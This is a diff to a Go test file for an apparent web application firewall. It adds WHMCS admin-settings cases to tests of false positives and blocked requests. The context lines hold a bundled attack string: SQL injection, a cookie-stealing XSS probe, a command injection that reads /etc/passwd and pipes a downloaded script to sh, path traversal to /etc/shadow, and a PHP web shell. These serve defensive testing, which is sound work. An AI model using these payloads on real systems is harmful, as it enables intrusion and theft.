@@ -34,6 +34,10 @@ func TestCustomerFalsePositivesWithCRS(t *testing.T) {
 	live := `{"_token":"abc","components":[{"snapshot":"{\"data\":{\"name\":\"\\u0645\\u0631\\u0627\\u06cc\\u0645\"}}","updates":{"name":"مریم <b>Khan</b>"},"calls":[]}]}`
 	attack := "id=" + urlEncode(`1' UNION SELECT username,password FROM users-- -`) + "&q=" + urlEncode(`<script>alert(document.cookie)</script>`) + "&cmd=" + urlEncode(`;cat /etc/passwd;wget http://198.51.100.9/x.sh|sh;`) + "&f=" + urlEncode(`../../../../etc/shadow`) + "&p=" + urlEncode(`<?php system($_GET['c']); ?>`)
 	sess := "Cookie: PHPSESSID=0123456789abcdef; XSRF-TOKEN=eyJpdiI6"
+	whmcs := "token=0a1b2c3d&tab=1&companyname=Xmart+Host&invoicepayto=" + urlEncode(`<b>Xmart Host</b><br>Lahore`) +
+		"&apiallowedips=" + urlEncode(`a:1:{i:0;a:2:{s:2:"ip";s:13:"203.0.113.10";s:4:"note";s:7:"billing";}}`) +
+		"&trackingcode=" + urlEncode(`<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123"></script>`)
+	whmcsSess := "Cookie: WHMCSy551iLvnhYt7=0123456789abcdef"
 	self := "Referer: https://ssc.example.pk/alms/Teacher/Editing.php?id=4"
 
 	cases := []struct {
@@ -65,6 +69,11 @@ func TestCustomerFalsePositivesWithCRS(t *testing.T) {
 		{"Cart spam: remove and add in one link", "shop.example.com", "GET", "/cart/?remove_item=abc123&add-to-cart=55", "", "", []string{"Cookie: woocommerce_items_in_cart=1"}, 403},
 		{"Cart change without a session", "shop.example.com", "GET", "/cart/?remove_item=abc123&_wpnonce=f00d", "", "", nil, 403},
 		{"Visitor removing a cart item", "shop.example.com", "GET", "/cart/?remove_item=abc123&_wpnonce=f00d", "", "", []string{"Cookie: woocommerce_items_in_cart=1; wp_woocommerce_session_x=y"}, 200},
+		// WHMCS admin (the admin folder has its own name) saving General Settings.
+		{"WHMCS admin saving settings", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{whmcsSess, "Referer: https://my.example.com/MANZ00R/configgeneral.php"}, 200},
+		{"Same save without the WHMCS session", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{"Referer: https://my.example.com/MANZ00R/configgeneral.php"}, 403},
+		{"Same save sent from another site", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{whmcsSess, "Referer: https://evil.example.net/x"}, 403},
+		{"Client area post with the WHMCS session stays checked", "my.example.com", "POST", "/submitticket.php", form, whmcs, []string{whmcsSess, "Referer: https://my.example.com/submitticket.php"}, 403},
 		// XML-RPC under Jetpack's name from outside Jetpack's network.
 		{"Fake Jetpack on XML-RPC", "blog.example.com", "POST", "/xmlrpc.php", "text/xml", `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>`, []string{"User-Agent: Jetpack by WordPress.com"}, 403},
 		{"Jetpack name behind Cloudflare is not judged", "blog.example.com", "POST", "/xmlrpc.php", "text/xml", `<?xml version="1.0"?><methodCall><methodName>jetpack.jsonAPI</methodName></methodCall>`, []string{"User-Agent: Jetpack by WordPress.com", "CF-Connecting-IP: 192.0.84.10"}, 200},
